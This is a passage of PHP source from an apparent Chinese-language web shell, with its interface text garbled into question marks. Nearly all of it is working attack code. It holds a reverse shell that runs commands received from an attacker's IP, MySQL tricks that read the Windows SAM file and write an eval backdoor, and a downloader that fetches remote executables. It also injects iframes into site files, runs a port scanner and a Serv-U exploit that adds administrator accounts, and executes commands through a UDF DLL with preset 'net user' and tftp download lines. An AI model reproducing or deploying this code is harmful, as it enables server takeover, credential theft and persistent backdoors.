                if (($sock = socket_create(AF_INET, SOCK_STREAM, $proto)) < 0) {
                    die("Socket???????");
                }
                if (($ret = socket_connect($sock, $host, $port)) < 0) {
                    die("???????");
                } else {
                    $message = "----------------------PHP????????--------------------\n";
                    socket_write($sock, $message, strlen($message));
                    $cwd = str_replace('\\', '/', dirname(__FILE__));
                    while ($cmd = socket_read($sock, 65535, $proto)) {
                        if (trim(strtolower($cmd)) == "exit") {
                            socket_write($sock, "Bye\n");
                            exit;
                        } else {
                            $process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
                            if (is_resource($process)) {
                                fwrite($pipes[0], $cmd);
                                fclose($pipes[0]);
                                $msg = stream_get_contents($pipes[1]);
                                socket_write($sock, $msg, strlen($msg));
                                fclose($pipes[1]);
                                $msg = stream_get_contents($pipes[2]);
                                socket_write($sock, $msg, strlen($msg));
                                $return_value = proc_close($process);
                            }
                        }
                    }
                }
            }
            if ($_POST['use'] == 'nc') {
                echo '<div class="actall">';
                $mip = $_POST['yourip'];
                $bport = $_POST['yourport'];
                $fp = fsockopen($mip, $bport, $errno, $errstr);
                if (!$fp) {
                    $result = "Error: could not open socket connection";
                } else {
                    fputs($fp, "\n*********************************************\n \r\n\t\t              hacking url:http://www.phpinfo.cc is ok!        \r\n\t\t\t          \n*********************************************\n\n");
                    while (!feof($fp)) {
                        fputs($fp, " [r00t@H4c3ing:/root]# ");
                        $result = fgets($fp, 4096);
                        $message = `{$result}`;
                        fputs($fp, "--> " . $message . "\n");
                    }
                    fclose($fp);
                }
                echo '</div>';
            }
            echo '<br>?????????????? (nc -vv -l ' . $_POST['yourport'] . ') ';
        }
        break;
    case "sqlshell":
        $MSG_BOX = '';
        $mhost = 'localhost';
        $muser = 'root';
        $mport = '3306';
        $mpass = '';
        $mdata = 'mysql';
        $msql = 'select version();';
        if (isset($_POST['mhost']) && isset($_POST['muser'])) {
            $mhost = $_POST['mhost'];
            $muser = $_POST['muser'];
            $mpass = $_POST['mpass'];
            $mdata = $_POST['mdata'];
            $mport = $_POST['mport'];
            if ($conn = mysql_connect($mhost . ':' . $mport, $muser, $mpass)) {
                @mysql_select_db($mdata);
            } else {
                $MSG_BOX = '????MYSQL???';
            }
        }
        $downfile = 'c:/windows/repair/sam';
        if (!empty($_POST['downfile'])) {
            $downfile = File_Str($_POST['downfile']);
            $binpath = bin2hex($downfile);
            $query = 'select load_file(0x' . $binpath . ')';
            if ($result = @mysql_query($query, $conn)) {
                $k = 0;
                $downcode = '';
                while ($row = @mysql_fetch_array($result)) {
                    $downcode .= $row[$k];
                    $k++;
                }
                $filedown = basename($downfile);
                if (!$filedown) {
                    $filedown = 'envl.tmp';
                }
                $array = explode('.', $filedown);
                $arrayend = array_pop($array);
                header('Content-type: application/x-' . $arrayend);
                header('Content-Disposition: attachment; filename=' . $filedown);
                header('Content-Length: ' . strlen($downcode));
                echo $downcode;
                exit;
            } else {
                $MSG_BOX = '??????????';
            }
        }
        $o = isset($_GET['o']) ? $_GET['o'] : '';
        print <<<END
<form method="POST" name="nform" id="nform">
<center><div class="actall"><a href="?eanver=sqlshell">[MYSQL??????]</a> 
<a href="?eanver=sqlshell&o=u">[MYSQL??????]</a> 
<a href="?eanver=sqlshell&o=d">[MYSQL???????]</a>
<a href="?eanver=sqlshell&o=tk">[MYSQL?????]</a> </div>
<div class="actall">
??? <input type="text" name="mhost" value="{$mhost}" style="width:110px">
??? <input type="text" name="mport" value="{$mport}" style="width:110px">
??? <input type="text" name="muser" value="{$muser}" style="width:110px">
???? <input type="text" name="mpass" value="{$mpass}" style="width:110px">
???? <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
        if ($o == 'u') {
            $uppath = 'C:/Documents and Settings/All Users/??????????/????/????/exp.vbs';
            if (!empty($_POST['uppath'])) {
                $uppath = $_POST['uppath'];
                $query = 'Create TABLE a (cmd text NOT NULL);';
                if (@mysql_query($query, $conn)) {
                    if ($tmpcode = File_Read($_FILES['upfile']['tmp_name'])) {
                        $filecode = bin2hex(File_Read($tmpcode));
                    } else {
                        $tmp = File_Str(dirname(myaddress)) . '/upfile.tmp';
                        if (File_Up($_FILES['upfile']['tmp_name'], $tmp)) {
                            $filecode = bin2hex(File_Read($tmp));
                            @unlink($tmp);
                        }
                    }
                    $query = 'Insert INTO a (cmd) VALUES(CONVERT(0x' . $filecode . ',CHAR));';
                    if (@mysql_query($query, $conn)) {
                        $query = 'SELECT cmd FROM a INTO DUMPFILE \'' . $uppath . '\';';
                        $MSG_BOX = @mysql_query($query, $conn) ? '?????????' : '?????????';
                    } else {
                        $MSG_BOX = '????????????';
                    }
                    @mysql_query('Drop TABLE IF EXISTS a;', $conn);
                } else {
                    $MSG_BOX = '????????????';
                }
            }
            print <<<END
<br><br>???°§?? <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>?????? <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="???" style="width:80px;">
END;
        } elseif ($o == 'tk') {
            if ($_POST['dump'] == 'dump') {
                $mysql_link = @mysql_connect($mhost, $muser, $mpass);
                mysql_select_db($mdata);
                mysql_query("SET NAMES gbk");
                $mysql = "";
                $q1 = mysql_query("show tables");
                while ($t = mysql_fetch_array($q1)) {
                    $table = $t[0];
                    $q2 = mysql_query("show create table `{$table}`");
                    $sql = mysql_fetch_array($q2);
                    $mysql .= $sql['Create Table'] . ";\r\n\r\n";
                    $q3 = mysql_query("select * from `{$table}`");
                    while ($data = mysql_fetch_assoc($q3)) {
                        $keys = array_keys($data);
                        $keys = array_map('addslashes', $keys);
                        $keys = join('`,`', $keys);
                        $keys = "`" . $keys . "`";
                        $vals = array_values($data);
                        $vals = array_map('addslashes', $vals);
                        $vals = join("','", $vals);
                        $vals = "'" . $vals . "'";
                        $mysql .= "insert into `{$table}`({$keys}) values({$vals});\r\n";
                    }
                    $mysql .= "\r\n";
                }
                $filename = date("Y-m-d-GisA") . ".sql";
                $fp = fopen($filename, 'w');
                fputs($fp, $mysql);
                fclose($fp);
                $tip = "<br><center>????????????????????????????[<a href=\"" . $filename . "\" title=\"???????\">" . $filename . "</a>]</center>";
            } else {
                $tip = "??¶ƒ??????????????????????ß’";
            }
            print <<<END
<div class="actall"><form method="post" action="?s=n&o=tk"><br>
????????????????????????????ç™?????? :-(<br><br>
{$tip}<br><br>
<input type="hidden" value="dump" name="dump" id="dump">
<input type="submit" value="???????" tilte="Submit" style="width:120px;height:64px;">
</form><div>
END;
        } elseif ($o == 'd') {
            print <<<END
<br><br><br>??????? <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="????" style="width:80px;">
END;
        } else {
            if (!empty($_POST['msql'])) {
                $msql = $_POST['msql'];
                if ($result = @mysql_query($msql, $conn)) {
                    $MSG_BOX = '???SQL?????<br>';
                    $k = 0;
                    while ($row = @mysql_fetch_array($result)) {
                        $MSG_BOX .= $row[$k];
                        $k++;
                    }
                } else {
                    $MSG_BOX .= mysql_error();
                }
            }
            print <<<END
<script language="javascript">
function nFull(i){
\tStr = new Array(11);
\tStr[0] = "select version();";
\tStr[1] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
\tStr[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'F:/web/bak.php';";
\tStr[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
\tStr[4] = "select @@plugin_dir";
\tStr[5] = "select 'xxx' into dumpfile 'C:\\\\\\\\MySQL\\\\\\\\lib::\$INDEX_ALLOCATION';";
\tStr[6] = "select 'xxx' into dumpfile 'C:\\\\\\\\MySQL\\\\\\\\lib\\\\\\\\plugin::\$INDEX_ALLOCATION';";
\tnform.msql.value = Str[i];
\treturn true;
}
</script>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
\t<option value="0" selected>????∑⁄</option>
\t<option value="1">???????</option>
\t<option value="2">ß’?????</option>
\t<option value="3">????????</option>
\t<option value="4">???MYSQL?????</option>
\t<option value="5">NTFS-ADS????????1</option>
\t<option value="5">NTFS-ADS????????2</option>
</select>
<input type="submit" value="???" style="width:80px;">
END;
        }
        if ($MSG_BOX != '') {
            echo '</div><div class="actall">' . $MSG_BOX . '</div></center></form>';
        } else {
            echo '</div></center></form>';
        }
        break;
    case "downloader":
        $Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
        $Com_dpath = isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(myaddress) . '/muma.exe');
        print <<<END
\t<form method="POST">
    <div class="actall">?????? <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
    <div class="actall">????? <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
    <div class="actall"><input value="????" type="submit" style="width:80px;"></div></form>
END;
        if (!empty($_POST['durl']) && !empty($_POST['dpath'])) {
            echo '<div class="actall">';
            $contents = @file_get_contents($_POST['durl']);
            if (!$contents) {
                echo '????????????????';
            } else {
                echo File_Write($_POST['dpath'], $contents, 'wb') ? '??????????' : '??????????';
            }
            echo '</div>';
        }
        break;
    case "issql":
        session_start();
        if ($_POST['sqluser'] && $_POST['sqlpass']) {
            $_SESSION['sql_user'] = $_POST['sqluser'];
            $_SESSION['sql_password'] = $_POST['sqlpass'];
        }
        if ($_POST['sqlhost']) {
            $_SESSION['sql_host'] = $_POST['sqlhost'];
        } else {
            $_SESSION['sql_host'] = 'localhost';
        }
        if ($_POST['sqlport']) {
            $_SESSION['sql_port'] = $_POST['sqlport'];
        } else {
            $_SESSION['sql_port'] = '3306';
        }
        if ($_SESSION['sql_user'] && $_SESSION['sql_password']) {
            if (!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']))) {
                unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
                die(html_a('?eanver=sqlshell', '???????????'));
            }
        } else {
            die(html_a('?eanver=sqlshell', '???????????'));
        }
        $query = mysql_query("SHOW DATABASES", $sqlcon);
        html_n('<tr><td>??????ß“?:');
        while ($db = mysql_fetch_array($query)) {
            html_a('?eanver=issql&db=' . $db['Database'], $db['Database']);
            echo '&nbsp;&nbsp;';
        }
        html_n('</td></tr>');
        if ($_GET['db']) {
            css_js("3");
            mysql_select_db($_GET['db'], $sqlcon);
            html_n('<tr><td><form method="POST" name="DbForm"><textarea name="sql" COLS="80" ROWS="3">' . $_POST['sql'] . '</textarea><br>');
            html_select(array(0 => "--SQL??--", 7 => "????????", 8 => "???????", 9 => "???????", 10 => "???????", 11 => "??????", 12 => "???????", 13 => "??????"), 0, "onchange='return Full(options[selectedIndex].value)'");
            html_input("submit", "doquery", "???");
            html_a("?eanver=issql&db=" . $_GET['db'], $_GET['db']);
            html_n('--->');
            html_a("?eanver=issql&db=" . $_GET['db'] . "&table=" . $_GET['table'], $_GET['table']);
            html_n('</form><br>');
            if (!empty($_POST['sql'])) {
                if (@mysql_query($_POST['sql'], $sqlcon)) {
                    echo "???SQL?????";
                } else {
                    echo "????: " . mysql_error();
                }
            }
            if ($_GET['table']) {
                html_n('<table border=1><tr>');
                $query = "SHOW COLUMNS FROM " . $_GET['table'];
                $result = mysql_query($query, $sqlcon);
                $fields = array();
                while ($row = mysql_fetch_assoc($result)) {
                    array_push($fields, $row['Field']);
                    html_n('<td><font color=#FFFF44>' . $row['Field'] . '</font></td>');
                }
                html_n('</tr><tr>');
                $result = mysql_query("SELECT * FROM " . $_GET['table'], $sqlcon) or die(mysql_error());
                while ($text = @mysql_fetch_assoc($result)) {
                    foreach ($fields as $row) {
                        if ($text[$row] == "") {
                            $text[$row] = 'NULL';
                        }
                        html_n('<td>' . $text[$row] . '</td>');
                    }
                    echo '</tr>';
                }
            } else {
                $query = "SHOW TABLES FROM " . $_GET['db'];
                $dat = mysql_query($query, $sqlcon) or die(mysql_error());
                while ($row = mysql_fetch_row($dat)) {
                    html_n("<tr><td><a href='?eanver=issql&db=" . $_GET['db'] . "&table=" . $row[0] . "'>" . $row[0] . "</a></td></tr>");
                }
            }
        }
        break;
    case "upfiles":
        html_n('<tr><td>??????????????????????ß≥: ' . @get_cfg_var('upload_max_filesize') . '<form method="POST" enctype="multipart/form-data">');
        html_input("text", "uppath", root_dir, "<br>?????°§??: ", "51");
        print <<<END
<SCRIPT language="JavaScript">
function addTank(){
var k=0;
  k=k+1;
  k=tank.rows.length;
  newRow=document.all.tank.insertRow(-1)
  <!--??????-->
  newcell=newRow.insertCell()
  newcell.innerHTML="<input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'>"
}

function delTank() {
  if(tank.rows.length==1) return;
  var checkit = false;
  for (var i=0;i<document.all.tankNo.length;i++) {
    if (document.all.tankNo[i].checked) {
      checkit=true;
      tank.deleteRow(i+1);
      i--;
    }
  }
  if (checkit) {
  } else{
    alert("?????????????????");
    return false;
  }
}
</SCRIPT>
<br><br>
<table cellSpacing=0 cellPadding=0 width="100%" border=0>       
          <tr>
            <td width="7%"><input class="button01" type="button"  onclick="addTank()" value=" ?? ?? " name="button2"/>
            <input name="button3"  type="button" class="button01" onClick="delTank()" value="???" />
            </td>
          </tr>
</table>
<table  id="tank" width="100%" border="0" cellpadding="1" cellspacing="1" >
<tr><td>????????????????</td></tr>
<tr><td><input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'></td></tr>
</table>
END;
        html_n('<br><input type="submit" name="upfiles" value="???" style="width:80px;"> <input type="button" value="????" onclick="window.location=\'?eanver=main&path=' . root_dir . '\';" style="width:80px;">');
        if ($_POST['upfiles']) {
            foreach ($_FILES["upfile"]["error"] as $key => $error) {
                if ($error == UPLOAD_ERR_OK) {
                    $tmp_name = $_FILES["upfile"]["tmp_name"][$key];
                    $name = $_FILES["upfile"]["name"][$key];
                    $uploadfile = str_path($_POST['uppath'] . '/' . $name);
                    $upload = @copy($tmp_name, $uploadfile) ? $name . $msg[2] : @move_uploaded_file($tmp_name, $uploadfile) ? $name . $msg[2] : $name . $msg[3];
                    echo '<br><br>' . $upload;
                }
            }
        }
        html_n('</form>');
        break;
    case "guama":
        $patht = isset($_POST['path']) ? $_POST['path'] : root_dir;
        $typet = isset($_POST['type']) ? $_POST['type'] : ".html|.shtml|.htm|.asp|.php|.jsp|.cgi|.aspx";
        $codet = isset($_POST['code']) ? $_POST['code'] : "<iframe src=\"http://localhost/eanver.htm\" width=\"1\" height=\"1\"></iframe>";
        html_n('<tr><td>???????????"|"????,???????????????.<form method="POST"><br>');
        html_input("text", "path", $patht, "°§????¶∂", "45");
        html_input("checkbox", "pass", "", "?????????", "", true);
        html_input("text", "type", $typet, "<br><br>???????", "60");
        html_text("code", "67", "5", $codet);
        html_n('<br><br>');
        html_radio("????????", "????????", "guama", "qingma");
        html_input("submit", "passreturn", "???");
        html_n('</td></tr></form>');
        if (!empty($_POST['path'])) {
            html_n('<tr><td>??????:<br><br>');
            if (isset($_POST['pass'])) {
                $bool = true;
            } else {
                $bool = false;
            }
            do_passreturn($patht, $codet, $_POST['return'], $bool, $typet);
        }
        break;
    case "tihuan":
        html_n('<tr><td>???????????ùI???????,??ß≥?????.<br><br><form method="POST">');
        html_input("text", "path", root_dir, "°§????¶∂", "45");
        html_input("checkbox", "pass", "", "?????????", "", true);
        html_text("newcode", "67", "5", $_POST['newcode']);
        html_n('<br><br>?ùI?');
        html_text("oldcode", "67", "5", $_POST['oldcode']);
        html_input("submit", "passreturn", "?ùI", "<br><br>");
        html_n('</td></tr></form>');
        if (!empty($_POST['path'])) {
            html_n('<tr><td>??????:<br><br>');
            if (isset($_POST['pass'])) {
                $bool = true;
            } else {
                $bool = false;
            }
            do_passreturn($_POST['path'], $_POST['newcode'], "tihuan", $bool, $_POST['oldcode']);
        }
        break;
    case "scanfile":
        css_js("4");
        html_n('<tr><td>?????????????????????MYSQL???????????????,???????.<br>???????????????,???????????,???????????????.<form method="POST" name="sform"><br>');
        html_input("text", "path", root_dir, "°§????", "45");
        html_input("checkbox", "pass", "", "?????????", "", true);
        html_input("text", "code", $_POST['code'], "<br><br>?????", "40");
        html_select(array("--MYSQL???????--", "Discuz", "PHPWind", "phpcms", "dedecms", "PHPBB", "wordpress", "sa-blog", "o-blog"), 0, "onchange='return Fulll(options[selectedIndex].value)'");
        html_n('<br><br>');
        html_radio("?????????", "????????????", "scanfile", "scancode");
        html_input("submit", "passreturn", "????");
        html_n('</td></tr></form>');
        if (!empty($_POST['path'])) {
            html_n('<tr><td>??????:<br><br>');
            if (isset($_POST['pass'])) {
                $bool = true;
            } else {
                $bool = false;
            }
            do_passreturn($_POST['path'], $_POST['code'], $_POST['return'], $bool);
        }
        break;
    case "scanphp":
        html_n('<tr><td>?????????????????,????????ßÿ??????????.<form method="POST"><br>');
        html_input("text", "path", root_dir, "?????¶∂", "40");
        html_input("checkbox", "pass", "", "?????????<br><br>???????", "", true);
        html_select(array("php" => "PHP", "asp" => "ASP", "aspx" => "ASPX", "jsp" => "JSP"));
        html_input("submit", "passreturn", "????", "<br><br>");
        html_n('</td></tr></form>');
        if (!empty($_POST['path'])) {
            html_n('<tr><td>??????:<br><br>');
            if (isset($_POST['pass'])) {
                $bool = true;
            } else {
                $bool = false;
            }
            do_passreturn($_POST['path'], $_POST['class'], "scanphp", $bool);
        }
        break;
    case "port":
        $Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
        $Port_port = isset($_POST['port']) ? $_POST['port'] : '21|23|25|80|110|135|139|445|1433|3306|3389|43958|5631|2049|873';
        print <<<END
<form method="POST">
<div class="actall">???IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
<div class="actall">???? <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
<div class="actall"><input type="submit" value="???" style="width:80px;"></div>
</form>
END;
        if (!empty($_POST['ip']) && !empty($_POST['port'])) {
            echo '<div class="actall">';
            $ports = explode('|', $_POST['port']);
            for ($i = 0; $i < count($ports); $i++) {
                $fp = @fsockopen($_POST['ip'], $ports[$i], $errno, $errstr, 2);
                echo $fp ? '<font color="#FF0000">?????? ---> ' . $ports[$i] . '</font><br>' : '????? ---> ' . $ports[$i] . '<br>';
                ob_flush();
                flush();
            }
            echo '</div>';
        }
        break;
    case "getcode":
        if (isset($_POST['url'])) {
            $proxycontents = @file_get_contents($_POST['url']);
            echo $proxycontents ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>??? URL ???????</b></p></center></body>";
            exit;
        }
        print <<<END
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form method="POST" target="proxyframe">
  <tr class="firstalt">
\t<td align="center"><b>???????</b></td>
  </tr>
  <tr class="secondalt">
\t<td align="center"  ><br><ul><li>?????????????? HTTP ????,?????????????°§?????????????CSS?????.</li><li>???????????????????????????URL,??????? SQL Injection ???????ßª???????.</li><li>???????????? URL,??????????????¶Ã?IP????? : {$_SERVER['SERVER_NAME']}</li></ul></td>
  </tr>
  <tr class="firstalt">
\t<td align="center" height=40  >URL: <input name="url" value="about:blank" type="text"  class="input" size="100" >
 <input name="" value="???" type="submit"  class="input" size="30" >
</td>
  </tr>
  <tr class="secondalt">
\t<td align="center"  ><iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="about:blank"></iframe></td>
  </tr>
</form></table>
END;
        break;
    case "servu":
        $SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
        print <<<END
<div class="actall"><a href="?eanver=servu">[???????]</a> <a href="?eanver=servu&o=adduser">[???????]</a></div>
<form method="POST">
\t<div class="actall">ServU??? <input name="SUPort" type="text" value="43958" style="width:300px"></div>
\t<div class="actall">ServU??? <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
\t<div class="actall">ServU???? <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
END;
        if ($_GET['o'] == 'adduser') {
            print <<<END
<div class="actall">??? <input name="user" type="text" value="envl" style="width:200px">
???? <input name="password" type="text" value="envl" style="width:200px">
?? <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
END;
        } else {
            print <<<END
<div class="actall">??????? <input name="SUCommand" type="text" value="net user KillWaf 1P@ssWord /add & net localgroup administrators KillWaf /add" style="width:600px"><br>
<input name="user" type="hidden" value="envl">
<input name="password" type="hidden" value="envl">
<input name="part" type="hidden" value="C:\\\\"></div>
END;
        }
        echo '<div class="actall"><input type="submit" value="???" style="width:80px;"></div></form>';
        if (!empty($_POST['SUPort']) && !empty($_POST['SUUser']) && !empty($_POST['SUPass'])) {
            echo '<div class="actall">';
            $sendbuf = "";
            $recvbuf = "";
            $domain = "-SETDOMAIN\r\n" . "-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n" . "-TZOEnable=0\r\n" . " TZOKey=\r\n";
            $adduser = "-SETUSERSETUP\r\n" . "-IP=0.0.0.0\r\n" . "-PortNo=21\r\n" . "-User=" . $_POST['user'] . "\r\n" . "-Password=" . $_POST['password'] . "\r\n" . "-HomeDir=c:\\\r\n" . "-LoginMesFile=\r\n" . "-Disable=0\r\n" . "-RelPaths=1\r\n" . "-NeedSecure=0\r\n" . "-HideHidden=0\r\n" . "-AlwaysAllowLogin=0\r\n" . "-ChangePassword=0\r\n" . "-QuotaEnable=0\r\n" . "-MaxUsersLoginPerIP=-1\r\n" . "-SpeedLimitUp=0\r\n" . "-SpeedLimitDown=0\r\n" . "-MaxNrUsers=-1\r\n" . "-IdleTimeOut=600\r\n" . "-SessionTimeOut=-1\r\n" . "-Expire=0\r\n" . "-RatioUp=1\r\n" . "-RatioDown=1\r\n" . "-RatiosCredit=0\r\n" . "-QuotaCurrent=0\r\n" . "-QuotaMaximum=0\r\n" . "-Maintenance=None\r\n" . "-PasswordType=Regular\r\n" . "-Ratios=None\r\n" . " Access=" . $_POST['part'] . "\\|RWAMELCDP\r\n";
            $deldomain = "-DELETEDOMAIN\r\n" . "-IP=0.0.0.0\r\n" . " PortNo=21\r\n";
            $sock = @fsockopen("127.0.0.1", $_POST["SUPort"], $errno, $errstr, 10);
            $recvbuf = @fgets($sock, 1024);
            echo "?????????: {$recvbuf} <br>";
            $sendbuf = "USER " . $_POST["SUUser"] . "\r\n";
            @fputs($sock, $sendbuf, strlen($sendbuf));
            echo "?????????: {$sendbuf} <br>";
            $recvbuf = @fgets($sock, 1024);
            echo "?????????: {$recvbuf} <br>";
            $sendbuf = "PASS " . $_POST["SUPass"] . "\r\n";
            @fputs($sock, $sendbuf, strlen($sendbuf));
            echo "?????????: {$sendbuf} <br>";
            $recvbuf = @fgets($sock, 1024);
            echo "?????????: {$recvbuf} <br>";
            $sendbuf = "SITE MAINTENANCE\r\n";
            @fputs($sock, $sendbuf, strlen($sendbuf));
            echo "?????????: {$sendbuf} <br>";
            $recvbuf = @fgets($sock, 1024);
            echo "?????????: {$recvbuf} <br>";
            $sendbuf = $domain;
            @fputs($sock, $sendbuf, strlen($sendbuf));
            echo "?????????: {$sendbuf} <br>";
            $recvbuf = @fgets($sock, 1024);
            echo "?????????: {$recvbuf} <br>";
            $sendbuf = $adduser;
            @fputs($sock, $sendbuf, strlen($sendbuf));
            echo "?????????: {$sendbuf} <br>";
            $recvbuf = @fgets($sock, 1024);
            echo "?????????: {$recvbuf} <br>";
            if (!empty($_POST['SUCommand'])) {
                $exp = @fsockopen("127.0.0.1", "21", $errno, $errstr, 10);
                $recvbuf = @fgets($exp, 1024);
                echo "?????????: {$recvbuf} <br>";
                $sendbuf = "USER " . $_POST['user'] . "\r\n";
                @fputs($exp, $sendbuf, strlen($sendbuf));
                echo "?????????: {$sendbuf} <br>";
                $recvbuf = @fgets($exp, 1024);
                echo "?????????: {$recvbuf} <br>";
                $sendbuf = "PASS " . $_POST['password'] . "\r\n";
                @fputs($exp, $sendbuf, strlen($sendbuf));
                echo "?????????: {$sendbuf} <br>";
                $recvbuf = @fgets($exp, 1024);
                echo "?????????: {$recvbuf} <br>";
                $sendbuf = "site exec " . $_POST["SUCommand"] . "\r\n";
                @fputs($exp, $sendbuf, strlen($sendbuf));
                echo "?????????: site exec <font color=#006600>" . $_POST["SUCommand"] . "</font> <br>";
                $recvbuf = @fgets($exp, 1024);
                echo "?????????: {$recvbuf} <br>";
                $sendbuf = $deldomain;
                @fputs($sock, $sendbuf, strlen($sendbuf));
                echo "?????????: {$sendbuf} <br>";
                $recvbuf = @fgets($sock, 1024);
                echo "?????????: {$recvbuf} <br>";
                @fclose($exp);
            }
            @fclose($sock);
            echo '</div>';
        }
        break;
    case "phpcode":
        $phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
        if ($phpcode != 'phpinfo();') {
            $phpcode = htmlspecialchars(base64_decode($phpcode));
        }
        echo '<script language="javascript">';
        html_base();
        echo 'function SubmitUrl(){
			document.getElementById(\'phpcode\').value = base64encode(document.getElementById(\'phpcode\').value);
			document.getElementById(\'sendcode\').submit();
	}</script><tr><td><form method="POST" id="sendcode" >????ß’&lt;? ?&gt;???,???????????BASE64????????????????????????????????ß≥ß≥???????????<br><br><textarea COLS="120" ROWS="35" name="phpcode" id="phpcode">' . $phpcode . '</textarea><br><br><input type="button" value="???" onclick="SubmitUrl();" style="width:80px;">';
        if (!empty($_POST['phpcode'])) {
            echo "<br><br>";
            eval(stripslashes(base64_decode($_POST['phpcode'])));
        }
        html_n('</form>');
        break;
    case "myexp":
        $MSG_BOX = '???????DLL,?????????.MYSQL????????root???,????°§???????????DLL???.<br>mysql5.1?∑⁄????????mysql????????UDF?????????????????NTFS-ADS??????????????';
        $info = '???????';
        $mhost = 'localhost';
        $muser = 'root';
        $mport = '3306';
        $mpass = '';
        $mdata = 'mysql';
        $mpath = 'C:/windows/mysqlDll.dll';
        $sqlcmd = 'ver';
        if (isset($_POST['mhost']) && isset($_POST['muser'])) {
            $mhost = $_POST['mhost'];
            $muser = $_POST['muser'];
            $mpass = $_POST['mpass'];
            $mdata = $_POST['mdata'];
            $mport = $_POST['mport'];
            $mpath = File_Str($_POST['mpath']);
            $sqlcmd = $_POST['sqlcmd'];
            $conn = mysql_connect($mhost . ':' . $mport, $muser, $mpass);
            if ($conn) {
                @mysql_select_db($mdata);
                if (!empty($_POST['outdll']) && !empty($_POST['mpath'])) {
                    $query = "CREATE TABLE Envl_Temp_Tab (envl BLOB);";
                    if (@mysql_query($query, $conn)) {
                        $shellcode = Mysql_shellcode();
                        $query = "INSERT into Envl_Temp_Tab values (CONVERT(" . $shellcode . ",CHAR));";
                        if (@mysql_query($query, $conn)) {
                            $query = 'SELECT envl FROM Envl_Temp_Tab INTO DUMPFILE \'' . $mpath . '\';';
                            if (@mysql_query($query, $conn)) {
                                $ap = explode('/', $mpath);
                                $inpath = array_pop($ap);
                                $query = 'Create Function state returns string soname \'' . $inpath . '\';';
                                $MSG_BOX = @mysql_query($query, $conn) ? '???DLL???' : '???DLL???';
                            } else {
                                $MSG_BOX = '????DLL??????';
                            }
                        } else {
                            $MSG_BOX = 'ß’??????????';
                        }
                        @mysql_query('DROP TABLE Envl_Temp_Tab;', $conn);
                    } else {
                        $MSG_BOX = '????????????';
                    }
                }
                if (!empty($_POST['runcmd'])) {
                    $query = 'select state("' . $sqlcmd . '");';
                    $result = @mysql_query($query, $conn);
                    if ($result) {
                        $k = 0;
                        $info = NULL;
                        while ($row = @mysql_fetch_array($result)) {
                            $infotmp .= $row[$k];
                            $k++;
                        }
                        $info = $infotmp;
                        $MSG_BOX = '??ß‘??';
                    } else {
                        $MSG_BOX = '??????';
                    }
                }
            } else {
                $MSG_BOX = '????MYSQL???';
            }
        }
        print <<<END
<script language="javascript">
function Fullm(i){
\tStr = new Array(11);
\tStr[0] = "ver";
\tStr[1] = "net user KillWaf 1P@ssWord /add";
\tStr[2] = "net localgroup administrators KillWaf /add";
\tStr[3] = "net start Terminal Services";
\tStr[4] = "tasklist /svc";
\tStr[5] = "netstat -ano";
\tStr[6] = "ipconfig";
\tStr[7] = "net user guest /active:yes";
\tStr[8] = "copy c:\\\\1.php d:\\\\2.php";
\tStr[9] = "tftp -i 219.134.6.245 get server.exe c:\\\\server.exe";
\tStr[10] = "net start telnet";
\tStr[11] = "shutdown -r -t 0";
\tmform.sqlcmd.value = Str[i];
\treturn true;
}
</script>
<form id="mform" method="POST">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<center><div class="actall">
??? <input type="text" name="mhost" value="{$mhost}" style="width:110px">
??? <input type="text" name="mport" value="{$mport}" style="width:110px">
??? <input type="text" name="muser" value="{$muser}" style="width:110px">
???? <input type="text" name="mpass" value="{$mpass}" style="width:110px">
???? <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div><div class="actall">
?????°§?? <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
<input type="submit" name="outdll" value="???DLL" style="width:80px;"></div>
<div class="actall">??????????? <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
<select onchange="return Fullm(options[selectedIndex].value)">
<option value="0" selected>--??????--</option>
<option value="1">????????</option>
<option value="2">?????????</option>
<option value="3">???????????</option>
<option value="4">???????PID</option>
<option value="5">??????PID</option>
<option value="6">??IP</option>
<option value="7">????guest???</option>
<option value="8">???????</option>
<option value="9">ftp????</option>
<option value="10">????telnet</option>
<option value="11">????</option>
</select>
